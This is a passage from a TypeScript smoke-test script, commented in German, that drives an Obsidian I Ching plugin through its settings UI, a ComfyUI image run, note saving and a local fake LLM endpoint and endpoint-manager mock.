    const opts = [...document.querySelectorAll(${JSON.stringify(ui.praefix)} + "select option")].map((o) => (o.textContent || "").toLowerCase());
    return { zeile: names.some((n) => n === "model" || n === "modell"), option: opts.some((o) => o.includes("global model")) };`);
  record(
    "C1b Keine Settings-Zeile „Model“ und keine Option „global model“",
    !modellUi.zeile && !modellUi.option,
    `Zeile „Model“: ${modellUi.zeile ? "da" : "fehlt"} · Option „global model“: ${modellUi.option ? "da" : "fehlt"}`,
  );

  const vorher = await bildSektion(ui);
  record(
    "C2 A1111-Ansicht zeigt Schritte, kein Workflow-Feld",
    vorher.backendWert === "a1111" && vorher.stepsA1111 && !vorher.workflowArea,
    `backend=${String(vorher.backendWert)} stepsFeld=${vorher.stepsA1111} workflowFeld=${vorher.workflowArea}`,
  );

  const umgeschaltet = await setzeBackend(ui, "comfyui");
  const comfy = await bildSektion(ui);
  record(
    "C3 Umschalten auf ComfyUI tauscht die Felder",
    umgeschaltet && comfy.workflowArea && comfy.stepsOverride && !comfy.stepsA1111,
    `workflowFeld=${comfy.workflowArea} override=${comfy.stepsOverride} a1111Steps=${comfy.stepsA1111}`,
  );
  if (!comfy.workflowArea) return;

  const eingefuegt = await setzeWorkflow(ui, workflowFixture);
  const ok = await workflowStatus(ui);
  const idCount = ok ? (ok.text.match(/=\d+/g) ?? []).length : 0;
  record(
    "C4 gueltiger Workflow wird erkannt",
    eingefuegt && Boolean(ok?.ok) && idCount === 4,
    ok ? `${idCount} Node-IDs · "${ok.text}"` : "keine Statuszeile",
  );

  await setzeWorkflow(ui, workflowFixture.slice(0, Math.floor(workflowFixture.length / 2)));
  const kaputt = await workflowStatus(ui);
  record(
    "C5 kaputtes JSON meldet einen Fehler statt zu haengen",
    Boolean(kaputt?.fehler) && (kaputt?.text.length ?? 0) > 0 && kaputt?.text !== ok?.text,
    kaputt ? `"${kaputt.text}"` : "keine Statuszeile",
  );

  // Leeres Feld: keine Meldung, kein Fehler — der Zustand "noch nicht eingerichtet".
  await setzeWorkflow(ui, "");
  const leer = await workflowStatus(ui);
  record(
    "C6 leeres Feld meldet nichts",
    leer !== null && !leer.ok && !leer.fehler && leer.text === "",
    leer ? `ok=${leer.ok} fehler=${leer.fehler} text="${leer.text}"` : "keine Statuszeile",
  );

  await setzeBackend(ui, "a1111");
  const zurueck = await bildSektion(ui);
  record(
    "C7 Zurueckschalten stellt die A1111-Felder wieder her",
    zurueck.stepsA1111 && !zurueck.workflowArea,
    `stepsFeld=${zurueck.stepsA1111} workflowFeld=${zurueck.workflowArea}`,
  );

  await closeSettings(cdp, ui);
}

/**
 * F — die deklarative Settings-API (`getSettingDefinitions`, Obsidian >= 1.13).
 *
 * Warum das ein eigener Abschnitt ist: die Migration verlegt das Rendern der Einstellungen
 * vom eigenen Code zum Host. Was danach in der Oberflaeche steht, kann kein vitest-Fall mehr
 * zeigen — und die drei Fallstricke der Umstellung sind alle **stille**: bedingte Zeilen, die
 * nie erscheinen (`visible` wertet der native Renderer an Gruppen-Items nicht aus), ein Tab,
 * der nach einer Zustandsaenderung nicht nachzieht (der Host rendert gecachte `settingItems`),
 * und Zeilen, die zwar rendern, aber nicht in der Einstellungs-Suche landen — dem einzigen
 * Grund, aus dem die Umstellung ueberhaupt lohnt.
 *
 * Unter 1.12 gibt es den nativen Pfad nicht; dort wird der Abschnitt uebersprungen statt rot.
 */
/** Die Punkte des Abschnitts F (Reihenfolge wie `PUNKTE`). */
const F_NAMEN = PUNKTE.filter((n) => n.startsWith("F"));

async function abschnittDeklarativ(cdp: Cdp, port: number): Promise<void> {
  console.log("\n── F · Deklarative Settings-API ──");

  const ui = await openSettingsTab(cdp, port);
  if (!ui) {
    for (const n of F_NAMEN) unmeasured(n, "Einstellungen-Tab in keinem Fenster gefunden");
    return;
  }

  // Die Definitionen leben im HAUPTfenster: das ausgelagerte Einstellungen-Fenster hat
  // seinen eigenen Kontext und kennt kein `app` (gemessen 2026-08-16 gegen 1.13.7 — ein
  // `app.setting.activeTab` dort wirft "app is not defined").
  const defs = await cdp.evaluate<{
    hatApi: boolean;
    hatUpdate: boolean;
    gruppen: number;
    leereGruppen: number;
    uebernommen: number | null;
    alle: number;
    fmMitFeldern: number;
    fmOhneFelder: number;
  } | null>(`
    const tab = app.setting.activeTab;
    if (!tab || typeof tab.getSettingDefinitions !== "function") return null;
    const fmGruppe = (d) => d.find((g) => (g.items || []).some((i) => i.control && i.control.key === "includeFrontmatter"));
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];

    const vorher = p.settings.includeFrontmatter;
    p.settings.includeFrontmatter = true;
    const mit = (fmGruppe(tab.getSettingDefinitions()).items || []).length;
    p.settings.includeFrontmatter = false;
    const ohne = (fmGruppe(tab.getSettingDefinitions()).items || []).length;
    p.settings.includeFrontmatter = vorher;

    // Erstes Element ist die Hilfe-Zeile (F9), keine Gruppe: Gruppen getrennt zaehlen, der Host
    // uebernimmt aber ALLE Elemente.
    const alle = tab.getSettingDefinitions();
    const d = alle.filter((g) => g.type === "group");
    return {
      alle: alle.length,
      hatApi: true,
      hatUpdate: typeof tab.update === "function",
      gruppen: d.length,
      leereGruppen: d.filter((g) => !(g.items || []).length).length,
      uebernommen: Array.isArray(tab.settingItems) ? tab.settingItems.length : null,
      fmMitFeldern: mit,
      fmOhneFelder: ohne,
    };
  `);

  if (!defs?.hatUpdate) {
    // Kein update() → Obsidian < 1.13, der native Pfad existiert nicht.
    for (const n of F_NAMEN) skipped(n, "Obsidian ohne native 1.13-Settings-API (Fallback-Pfad) — in dieser Lage nicht anwendbar");
    await closeSettings(cdp, ui);
    return;
  }

  record(
    "F1 Tab liefert deklarative Definitionen",
    defs.gruppen > 0 && defs.leereGruppen === 0 && defs.uebernommen === defs.alle,
    `${defs.gruppen} Gruppen + Hilfe-Zeile, keine leer, vom Host uebernommen: ${String(defs.uebernommen)} von ${defs.alle}`,
  );

  // Genau der Fallstrick, an dem zwei Nachbar-Plugins haengen geblieben sind: bedingte
  // Zeilen muessen WEGGELASSEN werden. Ein `visible: false` waere hier unsichtbar falsch —
  // die Zahl bliebe gleich und die Zeile stuende trotzdem in der Oberflaeche.
  record(
    "F2 bedingte Zeilen werden weggelassen, nicht versteckt",
    defs.fmOhneFelder === 1 && defs.fmMitFeldern > 1,
    `Frontmatter-Gruppe: ${defs.fmMitFeldern} Zeilen mit Feldern, ${defs.fmOhneFelder} ohne`,
  );

  const zeilenVorher = await zeilenZahl(ui);
  await cdp.evaluate(`
    await app.setting.activeTab.setControlValue("includeFrontmatter", false);
    await new Promise((r) => setTimeout(r, 500));
    return true;
  `);
  const zeilenAus = await zeilenZahl(ui);
  await cdp.evaluate(`
    await app.setting.activeTab.setControlValue("includeFrontmatter", true);
    await new Promise((r) => setTimeout(r, 500));
    return true;
  `);
  const zeilenWieder = await zeilenZahl(ui);
  const erwarteteDifferenz = defs.fmMitFeldern - defs.fmOhneFelder;
  record(
    "F3 Oberflaeche zieht nach einer Wertaenderung nach",
    zeilenVorher - zeilenAus === erwarteteDifferenz && zeilenWieder === zeilenVorher,
    `Zeilen ${zeilenVorher} → ${zeilenAus} → ${zeilenWieder} (erwartete Differenz ${erwarteteDifferenz})`,
  );

  // F9 — die Hilfe-Zeile (UI-STANDARD §8) ist die ERSTE Zeile oben im gezeichneten Tab, mit Text-Knopf
  // und `bug`-Knopf. Gemessen am DOM, nicht an den Definitionen: der Host kann umsortieren.
  // Geklickt wird nicht (der Klick oeffnete einen Browser); die URLs deckt tests/help-row.test.ts.
  const hilfe = await ui.cdp.evaluate<{ erste: string | null; knopf: string | null; bug: string | null }>(`
    const wurzel = ${wurzelAusdruck(ui)};
    const z = wurzel ? wurzel.querySelector(".setting-item") : null;
    return {
      erste: z?.querySelector(".setting-item-name")?.textContent?.trim() ?? null,
      knopf: z?.querySelector("button")?.textContent?.trim() ?? null,
      bug: z?.querySelector(".extra-setting-button")?.getAttribute("aria-label") ?? null,
    };
  `);
  record(
    "F9 die Hilfe-Zeile steht als erste Zeile oben im Settings-Tab",
    (hilfe.erste === "Help" || hilfe.erste === "Hilfe") && !!hilfe.knopf && !!hilfe.bug,
    `erste Zeile „${hilfe.erste}“, Knopf „${hilfe.knopf}“, bug-Tooltip „${hilfe.bug}“`,
  );

  // Der eigentliche Gewinn der Umstellung. Der Suchbegriff kommt aus der eigenen Definition,
  // nicht aus einer festen Zeichenkette — sonst misst der Treiber die UI-Sprache.
  const begriff = await cdp.evaluate<string>(`
    const d = app.setting.activeTab.getSettingDefinitions().filter((g) => g.type === "group");
    return d[0].items[0].name;
  `);
  const treffer = await sucheInEinstellungen(ui, begriff);
  const nichts = await sucheInEinstellungen(ui, "zzqqxx-gibtesnicht");
  record(
    "F4 Einstellungen erscheinen in Obsidians Einstellungs-Suche",
    treffer > 0 && nichts === 0,
    `"${begriff}" → ${treffer} Treffer unter "${PLUGIN_NAME}", Unsinn → ${nichts}`,
  );

  // F5 prueft den ANDEREN Pfad. Unter 1.13 ruft der Host `display()` nie — der Fallback
  // fuer aeltere Obsidian-Versionen liefe also ungeprueft mit. Ein direkter Aufruf zeichnet
  // ihn in denselben Container: dieselben Zeilen, mit der klassischen Setting-API gebaut.
  // Das ersetzt keine Messung auf einem echten 1.12, deckt aber den teuren Fehler ab (der
  // Walker zeichnet die Struktur gar nicht oder nur halb).
  const nativZeilen = await zeilenZahl(ui);
  await cdp.evaluate(`
    app.setting.activeTab.display();
    await new Promise((r) => setTimeout(r, 700));
    return true;
  `);
  const fallbackZeilen = await zeilenZahl(ui);
  record(
    "F5 Fallback-Pfad (< 1.13) zeichnet dieselbe Struktur",
    fallbackZeilen === nativZeilen,
    `nativ ${nativZeilen} Zeilen, display()-Fallback ${fallbackZeilen}`,
  );

  // F6/F7 messen die API-Schluessel-Zeile. Sie ist der einzige Fall, in dem eine Zeile
  // maskieren MUSS und die deklarative API es nicht kann (SettingTextControl kennt nur
  // type: 'text') — sie ist deshalb eine render-Hatch. Zwei Dinge koennen dabei still
  // schiefgehen, und beide waeren dem Nutzer gegenueber schwerwiegend:
  //   F6 — die Zeile faellt aus der Einstellungs-Suche. Genau die Auffindbarkeit war der
  //        ganze Ertrag von 0.5.0. Gesucht wird nach "token": der Begriff steht in KEINEM der
  //        vier Strings der Zeile (name/desc in EN und DE), ein Treffer beweist also, dass
  //        `aliases` durchschlaegt, und nicht nur, dass irgendein Wort irgendwo vorkommt.
  //        ⚠️ Hier stand zuerst "bearer" — und der Punkt war GRUEN, obwohl die Gegenprobe die
  //        Aliase entfernt hatte: "Authorization: Bearer …" steht in der Erklaerzeile, die
  //        derselbe Commit hinzugefuegt hat. Der Punkt mass die Beschreibung statt der Aliase.
  //        Gefunden hat das nur die Sabotage; ein gruener Erstlauf haette den Fehler
  //        beglaubigt (Muster von markdown-presentation, 2026-09-02: ein Punkt, der trotz
  //        Sabotage gruen BLEIBT, ist sofort verdaechtig).
  //   F7 — die Maskierung greift im nativen Pfad nicht. Der Unit-Test misst den Renderer
  //        gegen den Mock; ob Obsidian das inputEl wirklich so uebernimmt, sagt nur das
  //        laufende Programm.
  const trefferAlias = await sucheInEinstellungen(ui, "token");
  record(
    "F6 maskierte Zeile bleibt ueber Aliase auffindbar",
    trefferAlias > 0,
    `"token" → ${trefferAlias} Treffer unter "${PLUGIN_NAME}" (Begriff steht nur in den aliases)`,
  );

  await sucheInEinstellungen(ui, "");
  // Umgeschrieben: bis 0.10 ein globales Schluesselfeld; jetzt traegt jede Endpunkt-Zeile des Kit-
  // Bausteins ihren Schluessel im Schluesselbund und zeigt „gespeichert“ mit Stift („aendern“)
  // statt eines Feldes. Das Feld erscheint erst nach dem Klick auf den Stift — F7 misst es dort.
  const stiftGeklickt = await ui.cdp.evaluate<boolean>(`
    const wurzel = document.querySelector(".vertical-tab-content-container") || document;
    const zeile = wurzel.querySelector(".okit-ep-row");
    const stift = zeile?.querySelector(".extra-setting-button svg.lucide-pencil")?.closest(".extra-setting-button")
      ?? zeile?.querySelector(".extra-setting-button");
    if (!stift) return false;
    stift.click();
    return true;
  `);
  await schlaf(400);
  const maskiert = await ui.cdp.evaluate<{ felder: number; typen: string[] }>(`
    const wurzel = document.querySelector(".vertical-tab-content-container") || document;
    const zeile = wurzel.querySelector(".okit-ep-row");
    const felder = [...(zeile ?? wurzel).querySelectorAll("input")].filter((i) => i.type === "password");
    return { felder: felder.length, typen: felder.map((f) => f.type) };
  `);
  record(
    "F7 API-Schluessel-Feld der Endpunkt-Zeile ist maskiert (nach „aendern“)",
    stiftGeklickt && maskiert.felder === 1,
    stiftGeklickt ? `${maskiert.felder} Feld(er) mit type=password in der ersten Endpunkt-Zeile` : "kein „aendern“-Knopf an der Endpunkt-Zeile gefunden",
  );

  // F8 misst den SPEICHERpfad ueber das echte Feld (B8 den Ladepfad): eine Eingabe muss im
  // Schluesselbund ankommen (unter dem Eintrag der Zeile) und data.json ohne Klartext lassen.
  // Bewusst ueber die Komponente statt ueber `plugin.settings` — ein Punkt, der den Zustand direkt
  // schreibt, haette den Weg, auf dem ein Defekt saesse, nie betreten (REGISTRY: „Pruefpunkt, der
  // den Defektpfad umgeht“). Der native Setter + `input`-Event, dann `blur` (der Kit-Baustein
  // schreibt bei blur, nicht pro Tastendruck): eine blosse Zuweisung an `value` feuert nichts.
  // Getippt wird im Einstellungen-Fenster (eigener JS-Kontext, kennt kein `app`), gemessen im
  // Hauptfenster.
  const F8_WERT = "smoke-f8-schluessel";
  const zeilenId = await cdp.evaluate<string | null>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llm.endpoints[0]?.secretId ?? null;`);
  const getippt = await ui.cdp.evaluate<boolean>(`
    const wurzel = document.querySelector(".vertical-tab-content-container") || document;
    const feld = [...(wurzel.querySelector(".okit-ep-row") ?? wurzel).querySelectorAll("input")].find((i) => i.type === "password");
    if (!feld) return false;
    Object.getOwnPropertyDescriptor(Object.getPrototypeOf(feld), "value").set.call(feld, ${JSON.stringify(F8_WERT)});
    feld.dispatchEvent(new Event("input", { bubbles: true }));
    feld.dispatchEvent(new Event("blur"));
    return true;
  `);
  let f8 = { bund: null as Bund | null, wert: null as string | null };
  for (let i = 0; i < 12 && getippt; i++) {
    await schlaf(300);
    f8.bund = await schluesselbund(cdp);
    f8.wert = zeilenId && f8.bund ? (f8.bund[zeilenId] ?? null) : null;
    if (f8.wert === F8_WERT || f8.bund === null) break;
  }
  const f8Platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { endpoints?: Array<{ apiKey?: string }> } };
  const f8Klartext = (f8Platte.llm?.endpoints ?? []).some((e) => e.apiKey === F8_WERT);
  record(
    "F8 Eingabe im Feld landet im Schluesselbund (Eintrag der Zeile), nicht in data.json",
    getippt && (f8.bund ? f8.wert === F8_WERT && !f8Klartext : f8Klartext),
    !getippt
      ? "kein Passwortfeld gefunden"
      : f8.bund
        ? `Eintrag ${String(zeilenId)}=${JSON.stringify(f8.wert)} · Klartext in data.json: ${f8Klartext ? "ja" : "nein"}`
        : `kein Schluesselbund (< 1.11.4) — Klartext in data.json: ${f8Klartext ? "ja" : "nein"}`,
  );

  await closeSettings(cdp, ui);
}

/** Gerenderte Setting-Zeilen in der Einstellungen-Oberflaeche. */
async function zeilenZahl(ui: SettingsUi): Promise<number> {
  return ui.cdp.evaluate<number>(`
    const wurzel = ${wurzelAusdruck(ui)};
    return wurzel ? wurzel.querySelectorAll(".setting-item").length : -1;
  `);
}

/** Tippt in Obsidians Einstellungs-Suche und zaehlt die Treffer, die UNSEREM Plugin
 *  zugeordnet sind — die Ergebnisse stehen je Tab in einer eigenen Gruppe. */
async function sucheInEinstellungen(ui: SettingsUi, begriff: string): Promise<number> {
  return ui.cdp.evaluate<number>(`
    const feld = document.querySelector('input[type="search"]');
    if (!feld) return -1;
    feld.value = ${JSON.stringify(begriff)};
    feld.dispatchEvent(new Event("input", { bubbles: true }));
    await new Promise((r) => setTimeout(r, 600));
    const gruppe = [...document.querySelectorAll(".setting-search-result-group")].find(
      (g) => g.querySelector(".setting-search-result-tab-label")?.textContent?.trim() === ${JSON.stringify(PLUGIN_NAME)},
    );
    return gruppe ? gruppe.querySelectorAll(".setting-search-result-item").length : 0;
  `);
}

/** D — echter Bildlauf gegen ComfyUI (Handover-Schritte 4, 7, 8). Braucht einen
 *  laufenden Server; ohne ihn wird der Abschnitt als uebersprungen protokolliert,
 *  nicht als bestanden. */
async function abschnittBild(cdp: Cdp, endpoint: string, workflowFixture: string): Promise<void> {
  console.log("\n── D · Bildlauf gegen die echte ComfyUI ──");

  await cdp.evaluate(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    p.settings.image.backend = "comfyui";
    p.settings.image.endpoint = ${JSON.stringify(endpoint)};
    p.settings.image.comfyWorkflow = ${JSON.stringify(workflowFixture)};
    p.settings.image.size = 512;
    p.settings.image.comfyStepsOverride = 8;
    p.llm.invalidate(); await p.saveSettings();
    return true;
  `);
  // Das Panel liest die Einstellungen beim Zeichnen — neu aufbauen statt hoffen.
  await cdp.evaluate(`
    for (const l of app.workspace.getLeavesOfType(${JSON.stringify(PANEL_VIEW)})) l.detach();
    await new Promise((r) => setTimeout(r, 300));
    return true;
  `);
  await openPanel(cdp);
  await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
  await schlaf(500);

  const kasten = await cdp.evaluate<boolean>(`return Boolean(document.querySelector(".yijing-artwork"));`);
  record("D1 Bild-Kasten erscheint bei gesetztem Endpunkt", Boolean(kasten), kasten ? ".yijing-artwork im Panel" : "Kasten fehlt");
  if (!kasten) return;

  const gestartet = await clickPanelButton(cdp, ".yijing-artwork .yijing-actions button");
  record("D2 Generieren startet", gestartet, gestartet ? "Knopf geklickt" : "kein Knopf im Bild-Kasten");
  if (!gestartet) return;

  // Die Anzeige waehrend des Laufs. Zwei Ausgaenge sind richtig — ein Schrittzaehler
  // (Socket steht) oder der genannte Grund (Socket abgewiesen). Falsch ist nur das
  // Dritte: ein stummes "Bild wird generiert…", das minutenlang steht und von einem
  // haengenden Lauf nicht zu unterscheiden ist. Genau das war der Befund vom 2026-08-16.
  const anzeige = await pollUntil<string>(
    cdp,
    `const s = (document.querySelector(".yijing-artwork .yijing-empty")?.textContent || "");
     if (/\\d+\\s*\\/\\s*\\d+/.test(s)) return "zaehler";
     if (/cors|origin/i.test(s)) return "erklaert";
     return null;`,
    45_000,
    1000,
  );

  const bild = await pollUntil<number>(
    cdp,
    `const i = document.querySelector(".yijing-artwork-img"); return i && i.src.startsWith("data:image/png;base64,") ? i.src.length : 0;`,
    240_000,
    2000,
  );
  record(
    "D3 Bild kommt an und ist ein PNG",
    (bild ?? 0) > 10_000,
    `${bild ?? 0} Zeichen data:image/png (0 = kein Bild)`,
  );
  record(
    "D4 Anzeige zeigt Fortschritt oder nennt seinen Grund",
    anzeige !== null,
    anzeige === "zaehler"
      ? "Schrittzaehler gesehen (Socket steht)"
      : anzeige === "erklaert"
        ? "kein Socket, aber der Grund steht in der Zeile (ComfyUI-Origin-Pruefung)"
        : "stummes 'Bild wird generiert…' — sieht aus wie ein haengender Lauf",
  );
  if (!bild) return;

  const szene = await cdp.evaluate<number>(`return (document.querySelector(".yijing-artwork-scene")?.textContent || "").trim().length;`);
  record("D5 Szenen-Satz steht unter dem Bild", szene > 20, `${szene} Zeichen`);
}

/** D-Anhang — Speichern samt Anhang (Handover-Schritt 8). Legt eine Notiz im echten
 *  Vault an; sie wandert am Ende in den Papierkorb. */
async function abschnittSpeichern(cdp: Cdp, aufraeumen: string[]): Promise<void> {
  console.log("\n── E · Reading speichern ──");

  const vorher = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
  // Die zweite Aktionsreihe unter der Weissagung traegt "Speichern".
  const geklickt = await clickPanelButton(cdp, ".yijing-oracle > .yijing-actions:nth-of-type(2) button");
  await schlaf(1500);

  const neu = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
  const entstanden = neu.filter((p) => !vorher.includes(p));
  record(
    "E1 Speichern legt genau eine Notiz an",
    geklickt && entstanden.length === 1,
    entstanden.length ? entstanden.join(", ") : "keine neue Notiz",
  );
  if (entstanden.length !== 1) return;
  aufraeumen.push(entstanden[0]);

  const inhalt = await cdp.evaluate<{ laenge: number; bild: string | null }>(`
    const f = app.vault.getAbstractFileByPath(${JSON.stringify(entstanden[0])});
    const text = await app.vault.read(f);
    const m = text.match(/!\\[\\[([^\\]]+\\.png)\\]\\]/);
    return { laenge: text.length, bild: m ? m[1] : null };
  `);
  record("E2 Notiz traegt den Reading-Text", inhalt.laenge > 500, `${inhalt.laenge} Zeichen`);

  if (inhalt.bild) {
    const anhang = await cdp.evaluate<string | null>(`
      const f = app.metadataCache.getFirstLinkpathDest(${JSON.stringify(inhalt.bild)}, ${JSON.stringify(entstanden[0])});
      return f ? f.path : null;
    `);
    record("E3 Bild liegt als Anhang im Vault", Boolean(anhang), anhang ?? `Einbettung zeigt auf ${inhalt.bild}, Datei fehlt`);
    if (anhang) aufraeumen.push(anhang);
  } else {
    record("E3 Bild liegt als Anhang im Vault", false, "keine ![[…png]]-Einbettung in der Notiz");
  }
}

// --- M · LLM Endpoint Manager (optionale Fremd-Quelle) ------------------------------
// uebernommen aus lingotuner/scripts/gui-smoke.ts (Commits 2d32e53, 1899b68, 66bd0be),
// 2026-09-16 — Selektoren und Aufruf-Konstrukte auf yijing-oracle zugeschnitten
// (.yijing-oracle-Panel statt .lt-*, resolveLlmEndpoint()/generateInterpretation() statt
// tune(), M2b prueft ueber settings.llm.choice statt settings.choice).

const MANAGER_PLUGIN_ID = "llm-endpoint-manager";
const MANAGER_DEFAULT_MODEL = "smoke-manager-model";
const LOCAL_FALLBACK_MODEL = "smoke-lokal-modell";

interface FakeChatEndpoint { url: string; close: () => Promise<void>; chatCalls: () => number; lastModel: () => string | null; lastBody: () => Record<string, unknown> | null; lastAuth: () => string | null; pixelCalls: () => number }

/** Eigener Mini-HTTP-Server statt eines echten LLM-Servers oder des echten Manager-Plugins —
 *  M1-M3 pruefen die KONSUMENTEN-Seite (resolveLlmEndpoint()/findEndpointManager() in
 *  view.ts), nicht den Manager selbst. Sammelt den Request-Body VOLLSTAENDIG ein, bevor
 *  geantwortet wird (kein Race gegen die eigene Antwort — Fund aus lingotuner 66bd0be). */
async function startFakeChatEndpoint(modelId: string, antwort?: (body: Record<string, unknown>) => string): Promise<FakeChatEndpoint> {
  const { createServer } = await import("node:http");
  let chatCalls = 0;
  let lastModel: string | null = null;
  let lastBody: Record<string, unknown> | null = null;
  let lastAuth: string | null = null;
  let pixelCalls = 0;
  const server = createServer((req, res) => {
    // Der Renderer laeuft unter app://obsidian.md — ohne CORS-Header blockt der Browser den
    // Preflight (OPTIONS) und die eigentliche Anfrage sieht der Server nie.
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
    if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }
    if (req.url?.includes("/v1/models") === true) {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ data: [{ id: modelId, object: "model" }] }));
      return;
    }
    // V7/V8: ein Fernbild, das die Notiz von selbst laedt, landet hier — der Zaehler misst am Draht.
    if (req.method === "GET" && req.url?.startsWith("/pixel") === true) {
      pixelCalls += 1;
      res.writeHead(200, { "Content-Type": "image/gif" });
      res.end(Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"));
      return;
    }
    if (req.method === "POST" && req.url?.includes("/v1/chat/completions") === true) {
      let body = "";
      req.on("data", (chunk: Buffer) => { body += chunk.toString("utf8"); });
      req.on("end", () => {
        chatCalls += 1;
        lastAuth = typeof req.headers.authorization === "string" ? req.headers.authorization : null;
        try { lastBody = JSON.parse(body) as Record<string, unknown>; lastModel = (lastBody.model as string | undefined) ?? null; } catch { lastBody = null; lastModel = null; }
        res.writeHead(200, { "Content-Type": "text/event-stream" });
        const inhalt = antwort && lastBody ? antwort(lastBody) : "ok";
        res.write(`data: ${JSON.stringify({ choices: [{ delta: { content: inhalt }, finish_reason: null }], model: modelId })}\n\n`);
        res.write(`data: ${JSON.stringify({ choices: [{ delta: {}, finish_reason: "stop" }], model: modelId })}\n\n`);
        res.write("data: [DONE]\n\n");
        res.end();
      });
      return;
    }
    res.writeHead(404);
    res.end();
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  const port = typeof address === "object" && address ? address.port : 0;
  return {
    url: `http://127.0.0.1:${port}`,
    close: () => new Promise<void>((resolve) => { server.close(() => { resolve(); }); }),
    chatCalls: () => chatCalls,
    lastModel: () => lastModel,
    lastBody: () => lastBody,
    lastAuth: () => lastAuth,
    pixelCalls: () => pixelCalls,
  };
}

/** Injiziert eine FAKE `llm-endpoint-manager`-API — `findEndpointManager()` prueft nur die
 *  FORM (version===1 + alle Methoden als Funktion), keine Herkunft. `config.model` (nicht nur
 *  `defaultModel`) ist gesetzt, weil der ECHTE Manager beides setzt — ohne das Feld wuerde ein
 *  Fehler wie lingotuners C1 (config.model ueberschreibt eine getroffene Modellwahl) hier
 *  nicht reproduziert. Sichert einen vorher vorhandenen Eintrag statt ihn zu ueberschreiben
 *  (`window.__smokeVorherManager`, IM Renderer geparkt — ein echtes Plugin-Objekt traegt
 *  Methoden, die eine CDP-Rundreise ueber Node nicht ueberlebt). */
async function installFakeManager(cdp: Cdp, url: string): Promise<void> {
  await cdp.evaluate(`
    if (!("__smokeVorherManager" in window)) {
      window.__smokeVorherManager = app.plugins.plugins[${JSON.stringify(MANAGER_PLUGIN_ID)}] ?? null;
    }
    const ep = { id: "fake-mgr-ep", label: "Fake Manager Endpoint", url: ${JSON.stringify(url)}, provider: "openai", capabilities: ["chat"], defaultModel: ${JSON.stringify(MANAGER_DEFAULT_MODEL)}, enabled: true, hasSecret: false };
    const api = {
      version: 1,
      list: (filter) => [ep],
      get: (id) => (id === ep.id ? ep : null),
      resolve: async (capability, opts) => ({ id: ep.id, label: ep.label, config: { url: ${JSON.stringify(url)}, model: ${JSON.stringify(MANAGER_DEFAULT_MODEL)} }, defaultModel: ${JSON.stringify(MANAGER_DEFAULT_MODEL)} }),
      materialize: async (id, opts) => (id === ep.id ? { id: ep.id, label: ep.label, config: { url: ${JSON.stringify(url)}, model: ${JSON.stringify(MANAGER_DEFAULT_MODEL)} }, defaultModel: ${JSON.stringify(MANAGER_DEFAULT_MODEL)} } : { error: "not-found" }),
      models: async (id) => (id === ep.id ? [${JSON.stringify(MANAGER_DEFAULT_MODEL)}] : { error: "not-found" }),
      importEndpoints: async (eps, capability) => ({ added: [], merged: [], skipped: eps.map((e) => e.url) }),
      on: (event, cb) => (() => {}),
    };
    app.plugins.plugins[${JSON.stringify(MANAGER_PLUGIN_ID)}] = { api };
    return { ok: true };
  `);
}

/** Stellt den VOR `installFakeManager()` vorgefundenen Eintrag wieder her, statt ihn zu
 *  loeschen — idempotent bei einem Aufruf ohne vorheriges `installFakeManager()`. */
async function removeFakeManager(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    if ("__smokeVorherManager" in window) {
      const vorher = window.__smokeVorherManager;
      if (vorher === null) delete app.plugins.plugins[${JSON.stringify(MANAGER_PLUGIN_ID)}];
      else app.plugins.plugins[${JSON.stringify(MANAGER_PLUGIN_ID)}] = vorher;
      delete window.__smokeVorherManager;
    } else {
      delete app.plugins.plugins[${JSON.stringify(MANAGER_PLUGIN_ID)}];
    }
    return { ok: true };
  `);
}

const MANAGED_TEXT = ["Endpunkte kommen vom LLM Endpoint Manager", "Endpoints come from the LLM Endpoint Manager"];

/** Ein Wurf + Deutungslauf: braucht das offene Panel, wirft neu (das Ergebnis selbst ist fuer
 *  M irrelevant) und klickt danach den Deuten-Knopf — der ist der einzige Knopf in
 *  `.yijing-interpretation-inner .yijing-actions`, solange keine Deutung vorliegt. */
/** Textlaenge der Deutung beim Ende von `laufeDeutung` (vor einem Abbruch gemessen). */
let letzteDeutungLaenge = 0;

async function laufeDeutung(cdp: Cdp, wartenMs = 15000, frage = "Smoke M: Endpunkt-Manager", genugZeichen = 0): Promise<boolean> {
  const offen = await openPanel(cdp);
  if (!offen) return false;
  await cdp.evaluate(`
    const q = document.querySelector(".yijing-oracle .yijing-question");
    if (q) { q.value = ${JSON.stringify(frage)}; q.dispatchEvent(new Event("input")); }
    return true;
  `);
  const geworfen = await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
  if (!geworfen) return false;
  await schlaf(500);
  const geklickt = await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
  if (!geklickt) return false;
  // `genugZeichen` > 0: auch ein noch laufender Stream mit so viel Text zaehlt (und wird danach abgebrochen).
  // Ein echtes Modell kann ohne Token-Grenze minutenlang weiterschreiben — fuer „streamt“ genuegt der Beleg.
  const fertig = await pollUntil<boolean>(
    cdp,
    `const body = document.querySelector(".yijing-interpretation-body");
     const tail = document.querySelector(".okit-stream-tail");
     return (Boolean(body && body.textContent && body.textContent.trim().length > 0)
       || (${genugZeichen} > 0 && Boolean(tail && tail.textContent && tail.textContent.length >= ${genugZeichen}))) ? true : null;`,
    wartenMs,
    300,
  );
  if (fertig) {
    // Laenge VOR einem Abbruch merken (danach ist die Deutung weg). Noch im Stream und genug Text? Dann
    // Abbrechen klicken (der einzige Knopf in .yijing-actions, solange gestreamt wird).
